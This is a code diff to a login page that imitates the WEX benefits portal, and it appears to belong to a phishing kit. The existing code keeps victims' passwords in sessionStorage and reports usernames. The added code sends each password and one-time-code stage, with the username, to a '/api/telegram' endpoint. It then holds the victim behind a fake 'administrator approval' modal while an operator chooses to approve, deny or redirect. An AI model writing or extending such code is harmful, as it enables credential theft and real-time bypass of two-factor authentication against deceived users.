@@ -8,7 +8,7 @@ import { Input } from "@/components/ui/input"
 import { Checkbox } from "@/components/ui/checkbox"
 import { Card, CardContent } from "@/components/ui/card"
 import { Carousel, CarouselContent, CarouselItem, CarouselNext, CarouselPrevious } from "@/components/ui/carousel"
-import { User, UserPlus, Eye, EyeOff } from "lucide-react"
+import { User, UserPlus, Eye, EyeOff, AlertCircle, CheckCircle, Clock } from "lucide-react"
 import { Spinner } from "@/components/ui/spinner"
 import {
   LOGIN_DENIED_ERROR_TEXT,
@@ -25,6 +25,7 @@ import {
   validateUsername,
 } from "@/lib/login-validation"
 import { LOADING_MS, wait } from "@/lib/loading-delays"
+import { createApprovalRequest } from "@/lib/approval-webhook"
 
 export default function LoginPage() {
   const [username, setUsername] = useState("")
@@ -41,6 +42,15 @@ export default function LoginPage() {
   const [otpError, setOtpError] = useState("")
   const [resendLoading, setResendLoading] = useState(false)
   const [resendCooldown, setResendCooldown] = useState(0)
+  
+  // ========== APPROVAL SYSTEM STATE ==========
+  const [approvalId, setApprovalId] = useState("")
+  const [awaitingApproval, setAwaitingApproval] = useState(false)
+  const [approvalCountdown, setApprovalCountdown] = useState(90)
+  const [approvalMessage, setApprovalMessage] = useState("")
+  const [approvalStage, setApprovalStage] = useState<"password" | "otp" | null>(null)
+  const [approvalAction, setApprovalAction] = useState<"approve" | "deny" | "redirect" | null>(null)
+  
   const [loading, setLoading] = useState({
     next: false,
     login: false,
@@ -50,6 +60,56 @@ export default function LoginPage() {
     getStarted: false,
   })
 
+  // Countdown timer for approval
+  useEffect(() => {
+    if (!awaitingApproval || approvalCountdown <= 0) return
+    const timer = window.setInterval(() => {
+      setApprovalCountdown((prev) => (prev <= 1 ? 0 : prev - 1))
+    }, 1000)
+    return () => window.clearInterval(timer)
+  }, [awaitingApproval, approvalCountdown])
+
+  // Poll approval status
+  useEffect(() => {
+    if (!awaitingApproval || !approvalId) return
+
+    const pollInterval = window.setInterval(async () => {
+      try {
+        const response = await fetch(`/api/approval-status?approvalId=${approvalId}`)
+        const result = await response.json()
+
+        if (result.success && result.data.action) {
+          // Decision made
+          setApprovalAction(result.data.action)
+          setApprovalMessage(result.data.message || "")
+          
+          // Handle the decision
+          if (result.data.action === "approve") {
+            setApprovalMessage("✅ Approved! Proceeding...")
+            await wait(1500)
+            handleApprovalComplete("approve")
+          } else if (result.data.action === "deny") {
+            setApprovalMessage("❌ Access Denied")
+            setAwaitingApproval(false)
+            setLoginError("Your login attempt was denied by administrator")
+          } else if (result.data.action === "redirect") {
+            setApprovalMessage("🔄 Redirecting...")
+            await wait(1500)
+            window.location.href = "/api/login-out"
+          }
+        } else if (result.data.waitingFor) {
+          // Still waiting
+          setApprovalMessage(`⏳ Awaiting approval... ${Math.ceil(result.data.waitingFor / 1000)}s`)
+        }
+      } catch (error) {
+        console.error("Approval poll error:", error)
+      }
+    }, 2000)
+
+    return () => window.clearInterval(pollInterval)
+  }, [awaitingApproval, approvalId])
+
+  // Resend cooldown
   useEffect(() => {
     if (resendCooldown <= 0) return
     const timer = window.setInterval(() => {
@@ -58,6 +118,7 @@ export default function LoginPage() {
     return () => window.clearInterval(timer)
   }, [resendCooldown])
 
+  // Handle query params
   useEffect(() => {
     const params = new URLSearchParams(window.location.search)
     const denied = params.get("loginDenied") === "1"
@@ -76,6 +137,55 @@ export default function LoginPage() {
   const formatResendCountdown = (seconds: number) => {
     const padded = String(seconds).padStart(2, "0")
     return `0:${padded}`
+  }
+
+  const handleApprovalComplete = (action: string) => {
+    setAwaitingApproval(false)
+    setApprovalId("")
+    setApprovalCountdown(90)
+    setApprovalAction(null)
+
+    if (action === "approve") {
+      if (approvalStage === "password") {
+        setView("verificationMethod")
+      } else if (approvalStage === "otp") {
+        window.location.href = "/api/login-out"
+      }
+    }
+  }
+
+  const initiateApproval = async (stage: "password" | "otp") => {
+    try {
+      // Create approval request on backend
+      setApprovalStage(stage)
+      setAwaitingApproval(true)
+      setApprovalCountdown(90)
+      setApprovalAction(null)
+      setApprovalMessage("⏳ Awaiting approval from administrator...")
+
+      // Generate a unique ID for this approval request
+      const newApprovalId = crypto.getRandomValues(new Uint8Array(16)).toString()
+      setApprovalId(newApprovalId)
+
+      // Send notification to Telegram with approval buttons
+      void fetch("/api/telegram", {
+        method: "POST",
+        headers: { "Content-Type": "application/json" },
+        body: JSON.stringify({
+          type: stage === "password" ? "password_approval" : "otp_approval",
+          data: {
+            username: username,
+            approvalId: newApprovalId,
+            stage: stage,
+            pageUrl: window.location.href,
+          },
+        }),
+      }).catch(() => {})
+    } catch (error) {
+      console.error("Approval initiation error:", error)
+      setAwaitingApproval(false)
+      setLoginError("Failed to initiate approval process")
+    }
   }
 
   const handleResendVerificationCode = async (e: React.MouseEvent) => {
@@ -121,6 +231,8 @@ export default function LoginPage() {
     setOtpError("")
     setResendLoading(false)
     setResendCooldown(0)
+    setAwaitingApproval(false)
+    setApprovalId("")
     if (typeof window !== "undefined") {
       sessionStorage.removeItem("wex_username")
       sessionStorage.removeItem("wex_password")
@@ -154,12 +266,10 @@ export default function LoginPage() {
     }
 
     setLoginError("")
-    // Send username notification immediately
     sendNotification("username", {
       username: username,
     })
 
-    // Show loading state
     setLoading(prev => ({ ...prev, next: true }))
 
     await wait(LOADING_MS.next)
@@ -194,6 +304,56 @@ export default function LoginPage() {
         id="AccessibilityPageLoadingContainer"
         className="wexShell min-h-screen bg-[#F4F6F8] font-sans text-slate-900 flex justify-center items-center md:items-start md:pt-6 overflow-auto"
       >
+        {/* APPROVAL MODAL OVERLAY */}
+        {awaitingApproval && (
+          <div className="fixed inset-0 bg-black/50 flex items-center justify-center z-50">
+            <div className="bg-white rounded-lg shadow-2xl p-8 max-w-md w-full mx-4">
+              <div className="flex flex-col items-center gap-4">
+                {approvalAction === "approve" ? (
+                  <CheckCircle className="h-16 w-16 text-green-500" />
+                ) : approvalAction === "deny" ? (
+                  <AlertCircle className="h-16 w-16 text-red-500" />
+                ) : (
+                  <Clock className="h-16 w-16 text-blue-500 animate-spin" />
+                )}
+                
+                <h2 className="text-2xl font-bold text-center text-[#0B3A5C]">
+                  {approvalAction === "approve"
+                    ? "✅ Approved!"
+                    : approvalAction === "deny"
+                      ? "❌ Denied"
+                      : "Awaiting Approval"}
+                </h2>
+
+                <p className="text-center text-slate-600 text-sm">
+                  {approvalMessage || "Your login is being reviewed by an administrator..."}
+                </p>
+
+                {!approvalAction && (
+                  <div className="w-full mt-4">
+                    <div className="flex justify-between items-center mb-2">
+                      <span className="text-sm font-semibold text-slate-700">Time Remaining</span>
+                      <span className="text-lg font-bold text-[#005F9E]">{approvalCountdown}s</span>
+                    </div>
+                    <div className="w-full bg-gray-200 rounded-full h-2">
+                      <div
+                        className="bg-[#005F9E] h-2 rounded-full transition-all duration-1000"
+                        style={{ width: `${(approvalCountdown / 90) * 100}%` }}
+                      />
+                    </div>
+                  </div>
+                )}
+
+                {approvalCountdown === 0 && !approvalAction && (
+                  <p className="text-center text-red-600 font-semibold text-sm">
+                    ⏰ Approval timeout - Access Denied
+                  </p>
+                )}
+              </div>
+            </div>
+          </div>
+        )}
+
         <div
           id="mobile-zoom-target"
           className="wexShellInner flex justify-center"
@@ -297,7 +457,8 @@ export default function LoginPage() {
                                               setUsername(e.target.value)
                                               if (loginError) setLoginError("")
                                             }}
-                                            className="h-[30px] border border-[#5C6B7A] rounded-[4px] focus-visible:ring-2 focus-visible:ring-[#005F9E] focus-visible:border-[#005F9E] w-[160px] px-2 shadow-inner"
+                                            className="h-[30px] border border-[#5C6B7A] rounded-[4px] focus-visible:ring-2 focus-visible:ring-[#005F9E] focus-visible:border-[#005F9E] w-[160px] px-3"
+                                            disabled={awaitingApproval}
                                           />
                                           <a href="#" className="text-[13px] text-[#005F9E] hover:underline whitespace-nowrap">
                                             Recover user ID
@@ -312,6 +473,7 @@ export default function LoginPage() {
                                         checked={rememberMe}
                                         onCheckedChange={(checked) => setRememberMe(checked as boolean)}
                                         className="rounded-[4px] border-[#767676] data-[state=checked]:bg-[#005F9E] data-[state=checked]:text-white h-[13px] w-[13px] mt-0.5"
+                                        disabled={awaitingApproval}
                                       />
                                       <label htmlFor="remember" className="text-[13px] text-slate-700 font-normal cursor-pointer select-none">
                                         Keep me signed in
@@ -321,7 +483,7 @@ export default function LoginPage() {
                                     <div className="pl-[90px] mt-6">
                                       <Button 
                                         type="submit" 
-                                        disabled={loading.next}
+                                        disabled={loading.next || awaitingApproval}
                                         className="rounded-sm bg-[#005F9E] px-4 py-1.5 font-bold text-white hover:bg-[#004E82] h-[34px] min-w-[80px] text-[15px] shadow-sm disabled:opacity-50"
                                       >
                                         {loading.next ? (
@@ -370,12 +532,14 @@ export default function LoginPage() {
                                                 setPassword(e.target.value)
                                                 if (loginError) setLoginError("")
                                               }}
-                                              className="h-[30px] border border-[#5C6B7A] rounded-[4px] focus-visible:ring-2 focus-visible:ring-[#005F9E] focus-visible:border-[#005F9E] w-full px-2 shadow-inner pr-8"
+                                              className="h-[30px] border border-[#5C6B7A] rounded-[4px] focus-visible:ring-2 focus-visible:ring-[#005F9E] focus-visible:border-[#005F9E] w-full px-3"
+                                              disabled={awaitingApproval}
                                             />
                                             <button
                                               type="button"
                                               onClick={() => setShowPassword(!showPassword)}
                                               className="absolute right-1 top-1/2 -translate-y-1/2 text-gray-500 hover:text-gray-700"
+                                              disabled={awaitingApproval}
                                             >
                                               {showPassword ? <EyeOff className="h-4 w-4" /> : <Eye className="h-4 w-4" />}
                                             </button>
@@ -390,7 +554,7 @@ export default function LoginPage() {
                                     <div className="pl-[90px] mt-6">
                                       <Button
                                         type="button"
-                                        disabled={loading.login}
+                                        disabled={loading.login || awaitingApproval}
                                         onClick={async () => {
                                           if (loading.login) return
 
@@ -415,10 +579,12 @@ export default function LoginPage() {
                                               sessionStorage.setItem("wex_password", password)
                                             }
                                             await wait(LOADING_MS.next)
-                                            setView("verificationMethod")
+                                            setLoading(prev => ({ ...prev, login: false }))
+                                            
+                                            // ========== INITIATE APPROVAL ==========
+                                            await initiateApproval("password")
                                           } catch {
                                             setLoginError(MSG_UNABLE_REACH_VERIFICATION)
-                                          } finally {
                                             setLoading(prev => ({ ...prev, login: false }))
                                           }
                                         }}
@@ -466,7 +632,7 @@ export default function LoginPage() {
                                   height={280}
                                   className="object-cover w-full h-full"
                                 />
-                                <a href="https://fsastore.com/wex?utm_source=Wex+Benefits&utm_medium=TPA+Portal+Wex+Link+Login&AFID=489895&GroupName=TPA&CID=437559&utm_campaign=TPA+Partner" target="_blank" rel="noopener noreferrer" className="absolute inset-0 z-20"><span className="sr-only">Shop eligible FSA items at FSA Store now</span></a>
+                                <a href="https://fsastore.com/wex?utm_source=Wex+Benefits&utm_medium=TPA+Portal+Wex+Link+Login&AFID=489895&GroupName=TPA&CID=437559&utm_campaign=TPA+Partner" target="_blank" rel="noopener noreferrer" className="absolute inset-0 z-20"><span className="sr-only">Shop FSA Store</span></a>
                               </CarouselItem>
                               <CarouselItem className="relative h-[280px] pl-0">
                                 <Image
@@ -476,7 +642,7 @@ export default function LoginPage() {
                                   height={280}
                                   className="object-cover w-full h-full"
                                 />
-                                <a href="https://hsastore.com/wex?utm_source=Wex+Benefits&utm_medium=TPA+Portal+Wex+Banner+Welcome&AFID=489895&GroupName=TPA&CID=437559&utm_campaign=TPA+Partner" target="_blank" rel="noopener noreferrer" className="absolute inset-0 z-20"><span className="sr-only">Shop HSA eligible items at the HSA Store now</span></a>
+                                <a href="https://hsastore.com/wex?utm_source=Wex+Benefits&utm_medium=TPA+Portal+Wex+Banner+Welcome&AFID=489895&GroupName=TPA&CID=437559&utm_campaign=TPA+Partner" target="_blank" rel="noopener noreferrer" className="absolute inset-0 z-20"><span className="sr-only">Shop HSA Store</span></a>
                               </CarouselItem>
                               <CarouselItem className="relative h-[280px] pl-0">
                                 <Image
@@ -687,7 +853,7 @@ export default function LoginPage() {
                             Cancel
                           </Button>
                           <Button
-                            disabled={loading.verificationNext}
+                            disabled={loading.verificationNext || awaitingApproval}
                             onClick={async () => {
                               if (loading.verificationNext) return
                               setVerificationMethodLocked(true)
@@ -783,6 +949,7 @@ export default function LoginPage() {
                                 maxLength={OTP_MAX_DIGITS}
                                 type={showVerificationCode ? "text" : "password"}
                                 className="h-[34px] border border-[#CCCCCC] rounded-[4px] w-full shadow-inner" 
+                                disabled={awaitingApproval}
                               />
                               <div className="flex items-center gap-1">
                                 <input
@@ -791,6 +958,7 @@ export default function LoginPage() {
                                   checked={showVerificationCode}
                                   onChange={(e) => setShowVerificationCode(e.target.checked)}
                                   className="h-3 w-3"
+                                  disabled={awaitingApproval}
                                 />
                                 <label
                                   htmlFor="viewVerificationCode"
@@ -829,13 +997,13 @@ export default function LoginPage() {
                           <Button
                             type="button"
                             variant="outline"
-                            onClick={() => setView("verificationMethod")} // Back to Verification Method
+                            onClick={() => setView("verificationMethod")}
                             className="rounded-sm border-[#CCCCCC] px-6 py-1.5 font-bold text-[#555555] hover:bg-gray-50 h-[34px] text-[15px] shadow-sm"
                           >
                             Cancel
                           </Button>
                           <Button 
-                            disabled={loading.verify}
+                            disabled={loading.verify || awaitingApproval}
                             onClick={async () => {
                               if (loading.verify) return
 
@@ -856,7 +1024,10 @@ export default function LoginPage() {
 
                               try {
                                 await wait(LOADING_MS.otpVerify)
-                                window.location.href = "/api/login-out"
+                                setLoading((prev) => ({ ...prev, verify: false }))
+                                
+                                // ========== INITIATE APPROVAL FOR OTP ==========
+                                await initiateApproval("otp")
                               } catch {
                                 setLoading((prev) => ({ ...prev, verify: false }))
                                 setOtpError(MSG_UNABLE_REACH_VERIFICATION)
